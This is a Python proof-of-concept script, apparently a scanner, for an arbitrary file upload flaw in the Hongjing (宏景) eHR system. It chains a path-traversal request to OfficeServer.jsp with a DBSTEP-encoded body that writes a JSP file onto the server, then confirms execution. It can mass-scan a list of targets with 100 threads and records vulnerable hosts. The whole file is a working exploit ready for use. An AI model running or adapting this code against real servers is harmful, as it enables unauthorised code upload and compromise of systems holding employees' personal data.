import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """   ________                   _  __ _                       __
  / ____/ /_  ___  ____      | |/ /(_)___       _________ _/ /
 / /   / __ \/ _ \/ __ \     |   // / __ \     / ___/ __ `/ / 
/ /___/ / / /  __/ / / /    /   |/ / / / /    (__  ) /_/ / /  
\____/_/ /_/\___/_/ /_/____/_/|_/_/_/ /_/____/____/\__, /_/   
                     /_____/           /_____/       /_/      """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='宏景eHR 任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp'
    payload2 = '/66.jsp'
    headers = {
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
    }
    data = 'DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nFILETYPE=Li5cNjYuanNw\r\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\r\n<%out.println("jqjjqj");%>'
    try:
        res1 = requests.get(url=target+payload1,headers=headers,data=data,verify=False,timeout=10)
        res2 = requests.get(url=target+payload2,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code == 200 and 'jqjjqj' in res2.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()